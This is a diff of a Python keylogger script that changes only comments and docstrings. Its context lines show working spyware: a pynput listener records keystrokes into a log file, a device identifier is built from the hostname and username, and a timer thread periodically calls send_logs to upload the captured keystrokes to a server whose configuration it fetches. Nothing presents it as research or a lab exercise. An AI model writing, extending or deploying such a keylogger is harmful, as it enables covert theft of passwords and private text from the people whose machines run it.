@@ -7,14 +7,14 @@ import threading
 from pynput import keyboard
 from client import send_logs, get_log_file, get_config_from_server, get_send_interval
 
-# Get log file path and configuration from client module
+# Get log file path and config from client
 log_file = get_log_file()
 
-# Request configuration from server
+# Request config from server
 print("Requesting configuration from server...")
 get_config_from_server()
 
-# Get the send interval (may be updated by server)
+# Get the send interval
 SEND_INTERVAL = get_send_interval()
 
 current_sentence = ""
@@ -22,7 +22,7 @@ listener_active = True
 
 # Get device identifier
 def get_device_id():
-    """Generate a unique device identifier"""
+    """Generate device id"""
     hostname = socket.gethostname()
     username = os.getenv('USERNAME') or os.getenv('USER') or 'Unknown'
     system = platform.system()
@@ -42,12 +42,12 @@ def write_log(message):
     except Exception as e:
         print(f"Error writing log: {e}")
 
-# Initialize log file
+# Init log file
 write_log('"=== Session Started ==="')
 
-# Windows-specific: Map virtual key codes to characters
+# Map virtual key codes to characters 
 def vk_to_char(vk):
-    """Convert Windows virtual key code to character"""
+    """Convert vk code to character"""
     vk_number_map = {
         0x30: '0', 0x31: '1', 0x32: '2', 0x33: '3', 0x34: '4',
         0x35: '5', 0x36: '6', 0x37: '7', 0x38: '8', 0x39: '9'
@@ -68,9 +68,9 @@ def vk_to_char(vk):
     
     return None
 
-# Timer function to send logs periodically
+# Timer to send logs
 def auto_send_logs():
-    """Send logs automatically every SEND_INTERVAL seconds"""
+    """Send logs auto every SEND_INTERVAL"""
     global listener_active
     
     while listener_active:
@@ -84,7 +84,7 @@ def auto_send_logs():
             if success:
                 write_log('"=== New Session ==="')
 
-# Event - A key is pressed
+# Event - key pressed
 def on_press(key):
     global current_sentence
     
@@ -107,7 +107,7 @@ def on_press(key):
         elif key == keyboard.Key.tab:
             current_sentence += "\t"
 
-# Event - A key is released
+# Event - key released
 def on_release(key):
     global listener_active, current_sentence
     
